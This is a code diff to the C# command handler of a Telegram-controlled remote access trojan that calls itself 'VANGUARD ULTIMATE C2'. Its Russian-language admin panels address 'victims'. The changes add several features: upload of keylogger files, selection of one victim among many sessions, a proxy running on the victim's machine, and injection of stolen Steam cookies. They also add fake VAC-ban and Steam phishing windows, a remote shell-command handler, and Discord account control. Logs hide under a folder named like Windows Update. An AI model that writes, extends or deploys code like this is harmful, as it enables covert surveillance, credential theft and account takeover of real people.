@@ -1,5 +1,6 @@
 using System;
 using System.IO;
+using System.Text;
 using System.Collections.Generic;
 using System.Threading.Tasks;
 using System.IO.Compression;
@@ -16,8 +17,10 @@ using Microsoft.UpdateService.Modules;
 using FinalBot.Stealers;
 using FinalBot.Modules;
 using VanguardCore;
+using VanguardCore.Modules;
 using System.Linq;
 using File = System.IO.File;
+using System.Diagnostics;
 
 namespace FinalBot
 {
@@ -26,17 +29,35 @@ namespace FinalBot
         private readonly ITelegramBotClient _botClient;
         private readonly string _adminId;
         private readonly Dictionary<long, string> _userState = new Dictionary<long, string>();
+        private static readonly Dictionary<string, string> _fileIdCache = new Dictionary<string, string>();
+        private static int _fileIdCounter = 0;
 
-        private string _phishAgentName = "Valve_Security_Specialist_732";
-        private string _phishCookies = "";
-        private string _phishLang = "english";
+        private static string CacheFileId(string fileId)
+        {
+            string key = $"f_{++_fileIdCounter}";
+            _fileIdCache[key] = fileId;
+            return key;
+        }
+
+        private static string GetCachedFileId(string key)
+        {
+            return _fileIdCache.TryGetValue(key, out string val) ? val : key;
+        }
+
+        // Phishing state handled via PhishManager.cs static members for global synchronization
 
         // Discord Remote state
         private string _discordToken = "";
         private string _discordChannelUrl = "";
+        private static string? _targetVictimId = null;
+        private static bool _discordReady = false;
+
+        public static void SetDiscordReady(bool ready) => _discordReady = ready;
+        // NULL means anyone can respond to main menu, but only target responds to sub-menus
         private static int _lastDiscordMessageId = 0;
 
         public static int GetLastDiscordMessageId() => _lastDiscordMessageId;
+        public static void SetLastDiscordMessageId(int id) => _lastDiscordMessageId = id;
 
         public CommandHandler(ITelegramBotClient botClient, string adminId)
         {
@@ -48,7 +69,10 @@ namespace FinalBot
         {
             string line = $"[{DateTime.Now:HH:mm:ss}] {msg}";
             Console.WriteLine(line);
-            try { File.AppendAllText("C:\\Users\\Public\\edge_update_debug.log", line + "\n"); } catch { }
+            string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
+            if (!Directory.Exists(logDir)) try { Directory.CreateDirectory(logDir); } catch { }
+            string logPath = Path.Combine(logDir, "svc_debug.log");
+            try { File.AppendAllText(logPath, line + "\n"); } catch { }
         }
 
         public async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
@@ -56,13 +80,18 @@ namespace FinalBot
             try
             {
                 var message = update.Message ?? update.EditedMessage;
-                if (message != null && (message.Animation != null || message.Document != null || message.Video != null))
+                if (message != null)
                 {
-                    string? fileId = message.Animation?.FileId ?? message.Document?.FileId ?? message.Video?.FileId;
-                    if (fileId != null)
+                    // Automatic JSON cookie detection
+                    if (message.Document != null && message.Document.FileName != null && (message.Document.FileName.EndsWith(".json") || message.Document.FileName.EndsWith(".txt")))
                     {
-                        Log($"[MEDIA] Caught FileID: {fileId}");
-                        try { await _botClient.SendTextMessageAsync(_adminId, $"📥 <b>Media ID:</b>\n<code>{fileId}</code>", parseMode: ParseMode.Html); } catch { }
+                        string shortId = CacheFileId(message.Document.FileId);
+                        var markup = new InlineKeyboardMarkup(new[]
+                        {
+                            new[] { InlineKeyboardButton.WithCallbackData("✅ ДА, ИНЖЕКТИРОВАТЬ КУКИ (STEAM)", "vac_inject_f_" + shortId) },
+                            new[] { InlineKeyboardButton.WithCallbackData("❌ НЕТ, ПРОСТО ФАЙЛ", "back_to_main") }
+                        });
+                        await _botClient.SendTextMessageAsync(_adminId, "🍪 <b>Обнаружен JSON файл.</b> Инжектировать как куки Steam?", parseMode: ParseMode.Html, replyMarkup: markup);
                     }
                 }
 
@@ -108,25 +137,25 @@ namespace FinalBot
 
             if (_userState.TryGetValue(message.Chat.Id, out string state))
             {
-                if (state == "awaiting_agent_name")
+                if (state == "awaiting_vac_agent_name")
                 {
-                    _phishAgentName = text;
                     _userState.Remove(message.Chat.Id);
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Agent Name:</b> <code>{_phishAgentName}</code>", parseMode: ParseMode.Html);
+                    PhishManager.SetAgentName(text); 
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Имя агента успешно поменял:</b> <code>{text}</code>", parseMode: ParseMode.Html);
                     return;
                 }
-                else if (state == "awaiting_phish_cookies")
+                else if (state == "awaiting_vac_cookies")
                 {
-                    _phishCookies = text;
                     _userState.Remove(message.Chat.Id);
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>Steam Cookies Injected!</b>", parseMode: ParseMode.Html);
+                    PhishManager.SetCookies(text); 
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>Куки успешно принял и сохранил!</b>", parseMode: ParseMode.Html);
                     return;
                 }
                 else if (state == "awaiting_victim_name")
                 {
                     ConfigManager.VictimName = text;
                     _userState.Remove(message.Chat.Id);
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Victim name:</b> <code>{text}</code>", parseMode: ParseMode.Html);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Имя жертвы изменено на:</b> <code>{text}</code>", parseMode: ParseMode.Html);
                     return;
                 }
                 else if (state == "awaiting_discord_token")
@@ -134,14 +163,14 @@ namespace FinalBot
                     _discordToken = text.Trim();
                     _userState.Remove(message.Chat.Id);
                     _userState[message.Chat.Id] = "awaiting_discord_channel";
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ Token saved.\n⌨️ <b>Now enter the Discord voice channel URL:</b>", parseMode: ParseMode.Html);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ Токен сохранен.\n⌨️ <b>Теперь введи ссылку на голосовой канал Discord:</b>", parseMode: ParseMode.Html);
                     return;
                 }
                 else if (state == "awaiting_discord_channel")
                 {
                     _discordChannelUrl = text.Trim();
                     _userState.Remove(message.Chat.Id);
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Channel URL set.</b>\n🚀 Launching Discord bot...", parseMode: ParseMode.Html);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Ссылка установлена.</b>\n🚀 Запускаю бота...", parseMode: ParseMode.Html);
                     Log($"[DISCORD_REMOTE] Token: {_discordToken[..Math.Min(8, _discordToken.Length)]}... | URL: {_discordChannelUrl}");
                     string res = DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join");
                     await _botClient.SendTextMessageAsync(message.Chat.Id, res);
@@ -154,27 +183,40 @@ namespace FinalBot
                     string[] parts = text.Split('|');
                     if (parts.Length >= 2)
                     {
-                        _discordToken      = parts[0].Trim();
-                        _discordChannelUrl = parts[1].Trim();
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ Saved.\n🚀 Launching Discord Remote Bot (Progress will appear below)...", parseMode: ParseMode.Html);
-                        Log($"[DISCORD_REMOTE] Token: {_discordToken[..Math.Min(8, _discordToken.Length)]}... | URL: {_discordChannelUrl}");
+                        string tkn = parts[0].Trim();
+                        string url = parts[1].Trim();
+                        _discordToken = tkn;
+                        _discordChannelUrl = url;
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ Данные приняты.\n🚀 Запускаю Discord Remote Bot (Прогресс будет ниже)...", parseMode: ParseMode.Html);
+                        Log($"[DISCORD_REMOTE] Token: {tkn[..Math.Min(8, tkn.Length)]}... | URL: {url}");
                         
                         // Launch with explicit progress tracking
-                        TgMessage msg = await _botClient.SendTextMessageAsync(message.Chat.Id, "🎮 <b>Discord Remote Bot</b>\n━━━━━━━━━━━━━━━━━━\n🚀 Launching...\n━━━━━━━━━━━━━━━━━━", parseMode: ParseMode.Html);
+                        TgMessage msg = await _botClient.SendTextMessageAsync(message.Chat.Id, "🎮 <b>Discord Remote Bot</b>\n━━━━━━━━━━━━━━━━━━\n🚀 Запуск...\n━━━━━━━━━━━━━━━━━━", parseMode: ParseMode.Html);
                         _lastDiscordMessageId = msg.MessageId;
-                        DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join");
+                        DiscordRemoteManager.LaunchDiscordBot(tkn, url, "join");
                     }
                     else
                     {
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ Wrong format. Use: <code>token | discord_channel_url</code>", parseMode: ParseMode.Html);
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ Неверный формат. Используй: <code>токен | ссылка</code>", parseMode: ParseMode.Html);
                     }
                     return;
                 }
             }
 
-            if (text.StartsWith("/start") || text.StartsWith("/panel"))
+            if (text == "/start" || text == "/menu")
             {
                 await ShowAdminPanel(message.Chat.Id);
+            }
+            else if (text == "/sessions")
+            {
+                await ShowSessionsPanel(message.Chat.Id);
+            }
+            else if (text.StartsWith("/set_victim "))
+            {
+                string cmd = text.Substring(7).Trim();
+                Log($"[SHELL] Executing: {cmd}");
+                await _botClient.SendTextMessageAsync(message.Chat.Id, $"⚙️ Running: `{cmd}`", parseMode: ParseMode.Markdown);
+                string result = await ShellManager.ExecuteCommand(cmd);
             }
             else if (text == "/help")
             {
@@ -225,10 +267,16 @@ namespace FinalBot
             if (callbackQuery.Message is not { } message) return;
             string data = callbackQuery.Data ?? "";
 
-            Log($"[CALLBACK] {data}");
+            Log($"[CALLBACK] {data} (From: {ConfigManager.VictimName}, Target: {_targetVictimId ?? "GLOBAL"})");
 
             try
             {
+                // ALWAYS answer to stop the loading spinner
+                if (!data.StartsWith("fmd_") && !data.StartsWith("fmf_") && !data.StartsWith("fmp_") && !data.StartsWith("session_select_"))
+                {
+                    // Don't answer yet for these as they might need custom answers or take time
+                }
+
                 switch (data)
                 {
                     case "admin_panel":
@@ -246,12 +294,15 @@ namespace FinalBot
                         await _botClient.SendTextMessageAsync(message.Chat.Id, procs, parseMode: ParseMode.Markdown);
                         break;
                     case "panel_system":
+                        if (!await CheckTarget(callbackQuery.Id)) return;
                         await ShowSystemPanel(message.Chat.Id, message.MessageId);
                         break;
                     case "panel_work":
+                        if (!await CheckTarget(callbackQuery.Id)) return;
                         await ShowWorkPanel(message.Chat.Id, message.MessageId);
                         break;
                     case "panel_spyware":
+                        if (!await CheckTarget(callbackQuery.Id)) return;
                         await ShowSpywarePanel(message.Chat.Id, message.MessageId);
                         break;
                     case "set_victim_name":
@@ -267,17 +318,41 @@ namespace FinalBot
                     case "record_audio":
                         await HandleAudioRecord(message.Chat.Id);
                         break;
-                    case "clipboard":
-                        await HandleClipboard(message.Chat.Id);
-                        break;
                     case "clipboard_summary":
                         await HandleClipboardSummary(message.Chat.Id);
+                        break;
+                    case "keylog_get":
+                        await HandleKeylogGet(message.Chat.Id);
                         break;
                     case "system_info":
                         await HandleSystemInfo(message.Chat.Id);
                         break;
                     case "wifi_profiles":
-                        await HandleWifiProfiles(message.Chat.Id);
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, SystemInfoModule.GetWifiProfiles());
+                        break;
+
+                    case "proxy_toggle":
+                        if (!await CheckTarget(callbackQuery.Id)) return;
+                        if (ProxyModule.IsActive)
+                        {
+                            ProxyModule.Stop();
+                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🔴 Proxy Stopped");
+                        }
+                        else
+                        {
+                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🌐 Starting Proxy...");
+                            string res = await ProxyModule.Start();
+                            await _botClient.SendTextMessageAsync(message.Chat.Id, res);
+                        }
+                        await ShowSystemPanel(message.Chat.Id, message.MessageId);
+                        break;
+                    case "sessions_list":
+                        await ShowSessionsPanel(message.Chat.Id, message.MessageId);
+                        break;
+                    case "session_reset":
+                        _targetVictimId = null;
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "♻️ Session Reset (Global Mode)");
+                        await ShowAdminPanel(message.Chat.Id, message.MessageId);
                         break;
                     case "window_history":
                         await HandleWindowHistory(message.Chat.Id);
@@ -285,27 +360,39 @@ namespace FinalBot
 
                     // Phishing Actions
                     case "work_vac_alert":
-                        await ShowVACPanel(message.Chat.Id, message.MessageId);
-                        break;
-                    case "work_steam_phish":
-                        await ShowSteamPhishLangPanel(message.Chat.Id, message.MessageId);
+                    case "vac_panel":
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
+                        await ShowVacPanel(message.Chat.Id, message.MessageId);
                         break;
                     
                     case "vac_launch":
-                        PhishManager.LaunchSteamAlert();
-                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 VAC Alert launched!");
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "⏳ Launching VAC Alert...");
+                        await HandleVacLaunch(message.Chat.Id);
                         break;
+                    
+                    case "vac_lang_toggle":
                     case "vac_toggle_lang":
-                        PhishManager.SetVacLang(PhishManager.GetVacLang() == "en" ? "cn" : "en");
-                        await ShowVACPanel(message.Chat.Id, message.MessageId);
+                        string newLang = (PhishManager.GetVacLang() == "zh") ? "en" : "zh";
+                        PhishManager.SetVacLang(newLang);
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, $"🌐 Language: {newLang.ToUpper()}");
+                        await ShowVacPanel(message.Chat.Id, message.MessageId);
                         break;
+                    
+                    case "vac_set_name":
                     case "vac_set_agent":
-                        _userState[message.Chat.Id] = "awaiting_agent_name";
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Enter agent name for VAC:</b>", parseMode: ParseMode.Html);
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
+                        _userState[message.Chat.Id] = "awaiting_vac_agent_name";
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, "✏️ <b>Введи новое имя агента:</b>", parseMode: ParseMode.Html);
                         break;
+                    
                     case "vac_inject_cookies":
-                        _userState[message.Chat.Id] = "awaiting_phish_cookies";
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Paste Steam Cookies (JSON) for VAC:</b>", parseMode: ParseMode.Html);
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
+                        _userState[message.Chat.Id] = "awaiting_vac_cookies";
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, "🍪 <b>Пришли куки Steam (JSON или текст):</b>", parseMode: ParseMode.Html);
+                        break;
+
+                    case "work_steam_phish":
+                        await ShowSteamPhishLangPanel(message.Chat.Id, message.MessageId);
                         break;
 
                     case "steam_phish_en":
@@ -366,6 +453,28 @@ namespace FinalBot
                         break;
 
                     default:
+                        if (data.StartsWith("vac_inject_f_"))
+                        {
+                            string shortId = data.Replace("vac_inject_f_", "");
+                            string fileId = GetCachedFileId(shortId);
+                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "📥 Загружаю куки...");
+                            try
+                            {
+                                var file = await _botClient.GetFileAsync(fileId);
+                                using var ms = new MemoryStream();
+                                await _botClient.DownloadFileAsync(file.FilePath!, ms);
+                                string content = Encoding.UTF8.GetString(ms.ToArray());
+                                
+                                PhishManager.SetCookies(content);
+                                await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>Куки из файла успешно приняты и инжектированы!</b>", parseMode: ParseMode.Html);
+                            }
+                            catch (Exception ex)
+                            {
+                                await _botClient.SendTextMessageAsync(message.Chat.Id, $"❌ <b>Ошибка инъекции:</b> <code>{ex.Message}</code>", parseMode: ParseMode.Html);
+                            }
+                            return;
+                        }
+                        
                         if (data.StartsWith("fmd_"))
                         {
                             var pathInfo = data.Substring(4);
@@ -378,6 +487,12 @@ namespace FinalBot
                             }
                             var (view, keyMarkup) = FileManager.GetDirectoryView(realPath);
                             await EditOrSend(message.Chat.Id, message.MessageId, view, keyMarkup, ParseMode.Markdown);
+                        }
+                        else if (data.StartsWith("session_select_"))
+                        {
+                            _targetVictimId = data.Replace("session_select_", "");
+                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, $"🎯 Target: {_targetVictimId}");
+                            await ShowAdminPanel(message.Chat.Id, message.MessageId);
                         }
                         else if (data.StartsWith("fmf_"))
                         {
@@ -468,6 +583,18 @@ namespace FinalBot
         {
             string summary = ClipboardModule.GetSummary();
             await _botClient.SendTextMessageAsync(chatId, $"📋 <b>Clipboard Summary:</b>\n\n{summary}", parseMode: ParseMode.Html);
+        }
+        
+        private async Task HandleKeylogGet(long chatId)
+        {
+             string logFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_keys.log");
+             if (File.Exists(logFile))
+             {
+                 await _botClient.SendTextMessageAsync(chatId, "⌨️ <i>Uploading keylogs...</i>", parseMode: ParseMode.Html);
+                 using var stream = File.OpenRead(logFile);
+                 await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "Keylogs.txt"), caption: "⌨️ Remote Keylogs");
+             }
+             else await _botClient.SendTextMessageAsync(chatId, "❌ No keylogs found yet.");
         }
 
         private async Task HandleSystemInfo(long chatId)
@@ -560,24 +687,27 @@ namespace FinalBot
             {
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("💻 SYSTEM", "panel_system"),
-                    InlineKeyboardButton.WithCallbackData("💼 WORK", "panel_work")
+                    InlineKeyboardButton.WithCallbackData("💻 СИСТЕМА", "panel_system"),
+                    InlineKeyboardButton.WithCallbackData("💼 РАБОТА", "panel_work")
                 },
+                new[] { InlineKeyboardButton.WithCallbackData("🕵️‍♂️ ШПИОНАЖ", "panel_spyware") },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("👁️ SPYWARE", "panel_spyware"),
-                    InlineKeyboardButton.WithCallbackData("📊 FULL REPORT", "full_report")
+                    InlineKeyboardButton.WithCallbackData("👥 СЕССИИ", "sessions_list"),
+                    InlineKeyboardButton.WithCallbackData("📊 ПОЛНЫЙ ОТЧЕТ", "full_report")
                 },
-                new[] { InlineKeyboardButton.WithCallbackData("✍️ SET VICTIM NAME", "set_victim_name") }
+                new[] { InlineKeyboardButton.WithCallbackData("♻️ СБРОС ЦЕЛИ", "session_reset") },
+                new[] { InlineKeyboardButton.WithCallbackData("✍️ ИМЯ ЖЕРТВЫ", "set_victim_name") }
             });
 
+            string status = _targetVictimId == null ? "🌐 ГЛОБАЛЬНЫЙ" : $"🎯 {(_targetVictimId == ConfigManager.VictimName ? "АКТИВЕН" : "ОЖИДАНИЕ")}";
             string info = $"💎 <b>VANGUARD ULTIMATE C2</b>\n" +
                           $"━━━━━━━━━━━━━━━━━━\n" +
-                          $"👤 <b>Victim:</b> <code>{ConfigManager.VictimName}</code>\n" +
-                          $"⚡ <b>Rights:</b> {(ElevationService.IsAdmin() ? "🟢 Admin" : "User")}\n" +
+                          $"👤 <b>Жертва:</b> <code>{ConfigManager.VictimName}</code>\n" +
+                          $"📍 <b>Режим:</b> <code>{status}</code>\n" +
+                          $"⚡ <b>Права:</b> {(ElevationService.IsAdmin() ? "🟢 Админ" : "Юзер")}\n" +
                           $"🌐 <b>IP:</b> <code>{SystemInfoModule.GetExternalIP()}</code>\n" +
-                          $"⏰ <b>Time:</b> <code>{DateTime.Now:HH:mm:ss}</code>\n\n" +
-                          $"✨ <i>Select a control panel below:</i>";
+                          $"━━━━━━━━━━━━━━━━━━";
 
             await EditOrSend(chatId, messageId, info, markup);
         }
@@ -586,17 +716,18 @@ namespace FinalBot
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[] { InlineKeyboardButton.WithCallbackData("📋 CLIPBOARD", "clipboard"), InlineKeyboardButton.WithCallbackData("📜 SUMMARY", "clipboard_summary") },
+                new[] { InlineKeyboardButton.WithCallbackData("📋 БУФЕР", "clipboard"), InlineKeyboardButton.WithCallbackData("📜 СТАТИСТИКА", "clipboard_summary") },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("⚙️ SYSINFO", "system_info"),
-                    InlineKeyboardButton.WithCallbackData("📶 PROCESSES", "proc_list")
+                    InlineKeyboardButton.WithCallbackData("⚙️ ИНФО", "system_info"),
+                    InlineKeyboardButton.WithCallbackData("📶 ПРОЦЕССЫ", "proc_list")
                 },
-                new[] { InlineKeyboardButton.WithCallbackData("📡 WIFI PROFILES", "wifi_profiles") },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "back_to_main") }
+                new[] { InlineKeyboardButton.WithCallbackData(ProxyModule.IsActive ? "🌐 ПРОКСИ 🟢" : "🌐 ПРОКСИ 🔴", "proxy_toggle") },
+                new[] { InlineKeyboardButton.WithCallbackData("📡 WIFI ПРОФИЛИ", "wifi_profiles") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
             });
 
-            await EditOrSend(chatId, messageId, "💻 <b>SYSTEM PANEL</b>\nFile and process management:", markup);
+            await EditOrSend(chatId, messageId, "💻 <b>СИСТЕМНАЯ ПАНЕЛЬ</b>\nУправление файлами и процессами:", markup);
         }
 
         private async Task ShowWorkPanel(long chatId, int messageId)
@@ -605,8 +736,8 @@ namespace FinalBot
             {
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🚀 VAC ALERT", "work_vac_alert"),
-                    InlineKeyboardButton.WithCallbackData("🚀 STEAM PHISH", "work_steam_phish")
+                    InlineKeyboardButton.WithCallbackData("🚀 VAC АЛЕРТ", "vac_panel"),
+                    InlineKeyboardButton.WithCallbackData("🚀 STEAM ФИШИНГ", "work_steam_phish")
                 },
                 new[]
                 {
@@ -615,37 +746,50 @@ namespace FinalBot
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🌍 BROWSERS", "work_browsers"),
-                    InlineKeyboardButton.WithCallbackData("💰 CRYPTO", "work_crypto")
+                    InlineKeyboardButton.WithCallbackData("🌍 БРАУЗЕРЫ", "work_browsers"),
+                    InlineKeyboardButton.WithCallbackData("💰 КРИПТО", "work_crypto")
                 },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "back_to_main") }
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
             });
 
-            await EditOrSend(chatId, messageId, "💼 <b>WORK PANEL</b>\nLaunch phishing or collect data:", markup);
+            await EditOrSend(chatId, messageId, "💼 <b>РАБОЧАЯ ПАНЕЛЬ</b>\nЗапуск фишинга или сбор данных:", markup);
         }
 
-        private async Task ShowVACPanel(long chatId, int messageId)
+        private async Task ShowVacPanel(long chatId, int messageId)
         {
             string lang = PhishManager.GetVacLang();
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[] { InlineKeyboardButton.WithCallbackData("🚀 LAUNCH VAC WINDOW", "vac_launch") },
+                new[] { InlineKeyboardButton.WithCallbackData("🚀 ЗАПУСТИТЬ ОКНО VAC", "vac_launch") },
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData(lang == "en" ? "🇺🇸 ENGLISH" : "🇨🇳 CHINESE", "vac_toggle_lang"),
-                    InlineKeyboardButton.WithCallbackData("🕵️ AGENT NAME", "vac_set_agent")
+                    InlineKeyboardButton.WithCallbackData("🕵️ ИМЯ АГЕНТА", "vac_set_agent")
                 },
-                new[] { InlineKeyboardButton.WithCallbackData("🍪 INJECT COOKIES", "vac_inject_cookies") },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "panel_work") }
+                new[] { InlineKeyboardButton.WithCallbackData("🍪 ИНЖЕКТ КУКОВ", "vac_inject_cookies") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "panel_work") }
             });
 
-            string info = "🚨 <b>VAC ALERT CONFIG</b>\n" +
+            string info = "🚨 <b>НАСТРОЙКА VAC ALERT</b>\n" +
                           "━━━━━━━━━━━━━━━━━━\n" +
-                          $"🕵️ <b>Agent:</b> <code>{PhishManager.GetAgentName()}</code>\n" +
-                          $"🌐 <b>Lang:</b> {(lang == "en" ? "🇺🇸 EN" : "🇨🇳 CN")}\n" +
+                          $"🕵️ <b>Агент:</b> <code>{PhishManager.GetAgentName()}</code>\n" +
+                          $"🌐 <b>Язык:</b> {(lang == "en" ? "🇺🇸 EN" : "🇨🇳 CN")}\n" +
                           "━━━━━━━━━━━━━━━━━━";
 
             await EditOrSend(chatId, messageId, info, markup);
+        }
+
+        private async Task HandleVacLaunch(long chatId)
+        {
+            try
+            {
+                PhishManager.LaunchSteamAlert();
+                await _botClient.SendTextMessageAsync(chatId, "🚀 <b>VAC Alert Launched!</b>", parseMode: ParseMode.Html);
+            }
+            catch (Exception ex)
+            {
+                await _botClient.SendTextMessageAsync(chatId, $"❌ Launch failed: {ex.Message}");
+            }
         }
 
         private async Task ShowSteamPhishLangPanel(long chatId, int messageId)
@@ -657,10 +801,10 @@ namespace FinalBot
                     InlineKeyboardButton.WithCallbackData("🇺🇸 ENGLISH", "steam_phish_en"),
                     InlineKeyboardButton.WithCallbackData("🇨🇳 CHINESE", "steam_phish_cn")
                 },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "panel_work") }
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "panel_work") }
             });
 
-            await EditOrSend(chatId, messageId, "🎣 <b>STEAM PHISH</b>\n\n<b>Select window language:</b>", markup);
+            await EditOrSend(chatId, messageId, "🎣 <b>STEAM ФИШИНГ</b>\n\n<b>Выбери язык окна:</b>", markup);
         }
 
         private async Task ShowSpywarePanel(long chatId, int messageId)
@@ -669,28 +813,36 @@ namespace FinalBot
             {
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("📸 SCREENSHOT", "screenshot"),
-                    InlineKeyboardButton.WithCallbackData("🎤 MIC (10s)", "record_audio")
+                    InlineKeyboardButton.WithCallbackData("📸 СКРИНШОТ", "screenshot"),
+                    InlineKeyboardButton.WithCallbackData("⌨️ ЛОГИ КЛАВИШ", "keylog_get")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🎥 SCREEN REC (10s)", "record_video"),
-                    InlineKeyboardButton.WithCallbackData("🕹️ DISCORD REMOTE", "discord_remote_start")
+                    InlineKeyboardButton.WithCallbackData("📋 БУФЕР", "clipboard"),
+                    InlineKeyboardButton.WithCallbackData("📜 СТАТИСТИКА", "clipboard_summary")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🎙️ MIC", "discord_ctrl_mic"),
-                    InlineKeyboardButton.WithCallbackData("🔇 DEAF", "discord_ctrl_deaf")
+                    InlineKeyboardButton.WithCallbackData("🎤 МИКРО (10с)", "record_audio"),
+                    InlineKeyboardButton.WithCallbackData("🎥 ЗАПИСЬ ЭКРАНА (10с)", "record_video")
                 },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("🖥 STREAM", "discord_ctrl_stream"),
-                    InlineKeyboardButton.WithCallbackData("🔴 DISCONNECT", "discord_ctrl_disconnect")
-                },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "back_to_main") }
+                _discordReady ? 
+                    new[] { InlineKeyboardButton.WithCallbackData("🔴 ВЫКЛЮЧИТЬ DISCORD", "discord_ctrl_disconnect") } :
+                    new[] { InlineKeyboardButton.WithCallbackData("🕹️ DISCORD (ПОДКЛЮЧИТЬ)", "discord_remote_start") },
+                
+                _discordReady ? 
+                    new[]
+                    {
+                        InlineKeyboardButton.WithCallbackData("🎙️ МИК", "discord_ctrl_mic"),
+                        InlineKeyboardButton.WithCallbackData("🔇 УШИ", "discord_ctrl_deaf"),
+                        InlineKeyboardButton.WithCallbackData("🖥 ДЕМКА", "discord_ctrl_stream")
+                    } : 
+                    new InlineKeyboardButton[0],
+
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
             });
 
-            await EditOrSend(chatId, messageId, "👁️ <b>SPYWARE</b>\nHidden recording and Discord Remote:", markup);
+            await EditOrSend(chatId, messageId, "👁️ <b>ШПИОНАЖ</b>\nСкрытая запись и Discord Remote:", markup);
         }
 
         private async Task ShowHelp(long chatId)
@@ -709,5 +861,35 @@ namespace FinalBot
         {
             try { await action(); } catch { }
         }
+        private async Task<bool> CheckTarget(string callbackQueryId)
+        {
+            if (_targetVictimId != null && _targetVictimId != ConfigManager.VictimName)
+            {
+                // Silent ignore for non-targeted victims, but MUST answer callback
+                await _botClient.AnswerCallbackQueryAsync(callbackQueryId);
+                return false;
+            }
+            return true;
+        }
+
+        private async Task ShowSessionsPanel(long chatId, int messageId = 0)
+        {
+            var files = await GistManager.GetFiles();
+            var buttons = new List<InlineKeyboardButton[]>();
+            
+            foreach (var file in files.Keys)
+            {
+                if (file.StartsWith("victim_") && file.EndsWith(".json"))
+                {
+                    string name = file.Replace("victim_", "").Replace(".json", "");
+                    buttons.Add(new[] { InlineKeyboardButton.WithCallbackData($"👤 {name}", $"session_select_{name}") });
+                }
+            }
+            buttons.Add(new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "back_to_main") });
+
+            var markup = new InlineKeyboardMarkup(buttons);
+            await EditOrSend(chatId, messageId, "👥 <b>SESSION MANAGER</b>\nSelect a victim to control:", markup);
+        }
+
     }
 }
